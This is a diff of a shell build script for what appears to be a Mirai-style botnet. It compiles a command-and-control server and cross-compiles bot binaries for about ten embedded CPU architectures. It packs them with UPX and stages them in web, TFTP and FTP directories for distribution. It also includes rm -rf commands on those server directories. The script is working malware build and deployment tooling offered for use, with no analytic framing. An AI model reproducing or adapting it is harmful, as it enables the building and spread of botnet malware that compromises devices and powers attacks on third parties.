@@ -18,10 +18,10 @@ export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GO
 
                                                                                                                                                                                                                                                                                                                                                                                        
 rm -rf ~/release
-rm -rf /var/www/html
-rm -rf /var/lib/tftpboot
-rm -rf /var/ftp
-rm -rf /var/www/html/bins
+rm -rf /var/www/html/VR*
+rm -rf /var/lib/tftpboot/VR*
+rm -rf /var/ftp/VR*
+rm -rf /var/www/html/bins/VR*
 
 mkdir /var/ftp
 mkdir /var/lib/tftpboot
@@ -33,20 +33,20 @@ go mod tidy
 go build -o cncserver cnc/*.go
 
 echo "Building - debug"
-compile_bot i586 VRx86 "-static"
-compile_bot mips VRmips "-static"
-compile_bot mipsel VRmpsl "-static"
-compile_bot armv4l VRarm "-static"
-compile_bot armv5l VRarm5n
-compile_bot armv6l VRarm7 "-static"
-compile_bot powerpc VRppc "-static"
-compile_bot sparc VRspc "-static"
-compile_bot m68k VRm68k "-static"
-compile_bot sh4 VRsh4 "-static"
+compile_bot i586 VR.x86 "-static"
+compile_bot mips VR.mips "-static"
+compile_bot mipsel VR.mpsl "-static"
+compile_bot armv4l VR.arm "-static"
+compile_bot armv5l VR.arm5n
+compile_bot armv6l VR.arm7 "-static"
+compile_bot powerpc VR.ppc "-static"
+compile_bot sparc VR.spc "-static"
+compile_bot m68k VR.m68k "-static"
+compile_bot sh4 VR.sh4 "-static"
 compile_bot i586 dbg "-static -DDEBUG"
 cd release
 apt install upx -y upx --ultra-brute release/*
-mv VRx86 VRmips VRmpsl VRarm VRarm5n VRarm7 VRppc VRspc VRm68k VRsh4 /var/www/html/bins
+mv VR.x86 VR.mips VR.mpsl VR.arm VR.arm5n VR.arm7 VR.ppc VR.spc VR.m68k VR.sh4 /var/www/html/bins
 wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
 tar -xvf *.xz
 mv upx*/upx .
